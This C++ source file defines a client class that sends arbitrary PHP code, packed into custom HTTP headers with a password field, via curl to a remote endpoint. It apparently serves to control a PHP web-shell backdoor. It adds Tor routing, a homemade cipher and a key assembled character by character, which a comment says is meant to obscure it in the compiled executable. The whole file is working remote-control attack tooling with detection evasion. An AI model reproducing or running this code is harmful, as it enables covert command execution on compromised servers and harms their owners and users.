#include <cstdio>//For exec function
#include <memory>//For exec function
#include <stdexcept>//For exec function
#include <vector>//For headers string vec
#include <algorithm>//For encryption

int globalPhpObjCount = -1;

class PHP {
    private:
        std::string enc(char in) {//For obfuscating in compiled .exe application
            std::string out = "";
            out += in;
            return out;
        }

        int index;
        bool usingTor;
        std::string endpoint;
        std::vector<std::string> headers;
        std::string last_result;
        //Create your own strong key here. Replace this one.
        std::string key = enc('4') + enc('3') + enc('4') + enc('2') + enc('d') + enc('4') + enc('e') + enc('1') + enc('9') + enc('3') + enc('1') + enc('1') + enc('8') + enc('8') + enc('c') + enc('7') + enc('3') + enc('5') + enc('7') + enc('8') + enc('e') + enc('3') + enc('6') + enc('6') + enc('8') + enc('9') + enc('2') + enc('7') + enc('e') + enc('4') + enc('e') + enc('1') + enc('5') + enc('0') + enc('a') + enc('d') + enc('e') + enc('7') + enc('9') + enc('0') + enc('7') + enc('2') + enc('c') + enc('9') + enc('7') + enc('c') + enc('3') + enc('3') + enc('6') + enc('9') + enc('f') + enc('8') + enc('c') + enc('8') + enc('7') + enc('3') + enc('7') + enc('b') + enc('2') + enc('f') + enc('9') + enc('2') + enc('0') + enc('2') + enc('3') + enc('1') + enc('6') + enc('a') + enc('2') + enc('6') + enc('e') + enc('7') + enc('7') + enc('8') + enc('a') + enc('f') + enc('5') + enc('8') + enc('3') + enc('5') + enc('3') + enc('d') + enc('1') + enc('c') + enc('c') + enc('1') + enc('4') + enc('d') + enc('5') + enc('a') + enc('9') + enc('9') + enc('f') + enc('3') + enc('a') + enc('c') + enc('f') + enc('6') + enc('9') + enc('6') + enc('3') + enc('6') + enc('8') + enc('1') + enc('1') + enc('0') + enc('7') + enc('c') + enc('4') + enc('f') + enc('7') + enc('f') + enc('a') + enc('a') + enc('2') + enc('2') + enc('3') + enc('0') + enc('0') + enc('f') + enc('0') + enc('9') + enc('0') + enc('2') + enc('0') + enc('3') + enc('b') + enc('0') + enc('9') + enc('e') + enc('f') + enc('3') + enc('6') + enc('6') + enc('a') + enc('8') + enc('d') + enc('9') + enc('e') + enc('c') + enc('4') + enc('1') + enc('b') + enc('3') + enc('9') + enc('d') + enc('a') + enc('3') + enc('b') + enc('f') + enc('7') + enc('9') + enc('f') + enc('c') + enc('5') + enc('b') + enc('4') + enc('9') + enc('4') + enc('9') + enc('e') + enc('7') + enc('6') + enc('8') + enc('f') + enc('f') + enc('f') + enc('5') + enc('c') + enc('4') + enc('f') + enc('2') + enc('e') + enc('3') + enc('5') + enc('4') + enc('d') + enc('9') + enc('4') + enc('3') + enc('7') + enc('b') + enc('f') + enc('f') + enc('6') + enc('7') + enc('8') + enc('3') + enc('3') + enc('5') + enc('f') + enc('d') + enc('9') + enc('e') + enc('4') + enc('8') + enc('7') + enc('b') + enc('e') + enc('5') + enc('c') + enc('6') + enc('3') + enc('f') + enc('5') + enc('5') + enc('4') + enc('7') + enc('a') + enc('f') + enc('4') + enc('8') + enc('5') + enc('5') + enc('3') + enc('a') + enc('6') + enc('c') + enc('5') + enc('4') + enc('d') + enc('7') + enc('5') + enc('9') + enc('e') + enc('c') + enc('6') + enc('1') + enc('9') + enc('1') + enc('e') + enc('8') + enc('d') + enc('e') + enc('e') + enc('7') + enc('1') + enc('7') + enc('0') + enc('d') + enc('6') + enc('b') + enc('d') + enc('7') + enc('8') + enc('4') + enc('8') + enc('6') + enc('a') + enc('1') + enc('6') + enc('c') + enc('0') + enc('1') + enc('2') + enc('2') + enc('f') + enc('e') + enc('a') + enc('5') + enc('9') + enc('3') + enc('9') + enc('5') + enc('7') + enc('1') + enc('9') + enc('7') + enc('6') + enc('f') + enc('e') + enc('d') + enc('b') + enc('8') + enc('b') + enc('2') + enc('1') + enc('2') + enc('2') + enc('0') + enc('d') + enc('4') + enc('7') + enc('8') + enc('4') + enc('a') + enc('3') + enc('0') + enc('3') + enc('b') + enc('d') + enc('0') + enc('6') + enc('7') + enc('f') + enc('3') + enc('9') + enc('5') + enc('f') + enc('3') + enc('e') + enc('f') + enc('1') + enc('2') + enc('c') + enc('5') + enc('3') + enc('5') + enc('1') + enc('b') + enc('8') + enc('a') + enc('8') + enc('6') + enc('8') + enc('5') + enc('5') + enc('9') + enc('2') + enc('e');

        std::string exec(const char* cmd) {//Return cmd command results
            std::array<char, 128> buffer;
            std::string result;
            std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
            if (!pipe) {
                throw std::runtime_error("popen() failed!");
            }
            while (!feof(pipe.get())) {
                if (fgets(buffer.data(), 128, pipe.get()) != nullptr) {
                    result += buffer.data();
                }
            }
            return result;
        }

        std::string customEncrypt(const std::string& plaintext, const std::string& key) {
            std::string ciphertext = plaintext;

            for (size_t i = 0; i < plaintext.length(); ++i) {
                ciphertext[i] = ((plaintext[i] - ' ') + (key[i % key.length()] - ' ')) % 95 + ' ';//Mod 95 for ASCII only, so binary is excluded.
            }

            std::reverse(ciphertext.begin(), ciphertext.end());

            int offset = 3;
            for (char& c : ciphertext) {
                if (isprint(c)) {
                    c = ((c - ' ') + offset) % 95 + ' ';
                }
            }

            return ciphertext;
        }

        std::string customDecrypt(const std::string& ciphertext, const std::string& key) {
            std::string decrypted = ciphertext;

            int offset = 3;
            for (char& c : decrypted) {
                if (isprint(c)) {
                    c = ((c - ' ') - offset + 95) % 95 + ' ';
                }
            }

            std::reverse(decrypted.begin(), decrypted.end());

            for (size_t i = 0; i < decrypted.length(); ++i) {
                decrypted[i] = ((decrypted[i] - ' ') - (key[i % key.length()] - ' ') + 95) % 95 + ' ';
            }

            return decrypted;
        }

    public:
        PHP(std::string endpoint_in, std::vector<std::string> headers_in, bool usingTor_in = false) {
            index = ++globalPhpObjCount;
            endpoint = endpoint_in;
            headers = headers_in;
            usingTor = usingTor_in;
            if (usingTor) {
                system("start tor.vbs");
            }
        }
        std::string getEndpoint() {
            return endpoint;
        }
        void setEndpoint(std::string in) {
            endpoint = in;
        }
        int getIndex() {
            return index;
        }
        std::string execute(std::vector<std::string> code_in) {
            std::string code;
            std::string final_code;
            for (auto c : code_in) {
                code += c;
            }

            for (auto c : code) {//Double quote fix
                if (c == '"') {
                    final_code += headers[10];
                }
                else if (c == '\'') {//Single quote fix
                    final_code += headers[11];
                }
                else {
                    final_code += c;
                }
            }
            code = final_code;
            std::string curlHeadCommand = "curl";
            if (usingTor) {
                curlHeadCommand = "curl --socks5-hostname localhost:9050";
            }
            std::string curlCommand = curlHeadCommand + " -k -s -H \"Content-Type: " + headers[0] + "\" -H \"Protocol: " + headers[1] + "\" -H \"Type: " + headers[2] + "\" -H \"Name: " + headers[3] + "\" -H \"Password: " + headers[4] + "\" -H \"J1: " + headers[5] + "\" -H \"J2: " + headers[6] + "\" -H \"J3: " + headers[7] + "\" -H \"J4: " + headers[8] + "\" -H \"J5: " + headers[9] + "\" -H \"Code: " + code + "\" -H \"Dqcode: " + headers[10] + "\" -H \"Sqcode: " + headers[11] + "\" \"" + endpoint + "\"";
            last_result = exec(curlCommand.c_str());
            return last_result;
        }
        std::string getLastResult() {
            return last_result;
        }
        std::string encrypt(std::string txt) {
            return customEncrypt(txt, key);
        }
        std::string decrypt(std::string txt) {
            return customDecrypt(txt, key);
        }
};
